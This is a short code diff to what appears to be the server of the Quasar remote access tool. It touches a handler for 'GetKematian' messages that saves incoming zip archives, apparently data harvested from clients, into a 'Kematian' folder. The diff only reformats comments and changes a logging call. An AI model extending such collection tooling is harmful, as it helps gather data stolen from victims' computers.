@@ -36,9 +36,9 @@ namespace Quasar.Server.Messages
             if (message is GetKematian zipMessage)
             {
 
-                        //public string DownloadDirectory => _downloadDirectory ?? (_downloadDirectory = (!FileHelper.HasIllegalCharacters(UserAtPc))
-                        //                       ? Path.Combine(Application.StartupPath, $"Clients\\{UserAtPc}_{Id.Substring(0, 7)}\\")
-                        //                       : Path.Combine(Application.StartupPath, $"Clients\\{Id}\\"));
+                //public string DownloadDirectory => _downloadDirectory ?? (_downloadDirectory = (!FileHelper.HasIllegalCharacters(UserAtPc))
+                //                       ? Path.Combine(Application.StartupPath, $"Clients\\{UserAtPc}_{Id.Substring(0, 7)}\\")
+                //                       : Path.Combine(Application.StartupPath, $"Clients\\{Id}\\"));
                 string outPath = Path.Combine(Application.StartupPath, "Kematian");
 
                 if (!Directory.Exists(outPath))
@@ -55,7 +55,7 @@ namespace Quasar.Server.Messages
                 }
                 catch (Exception ex)
                 {
-                    Console.WriteLine(ex.Message);
+                    Debug.WriteLine(ex.Message);
                 }
             }
 
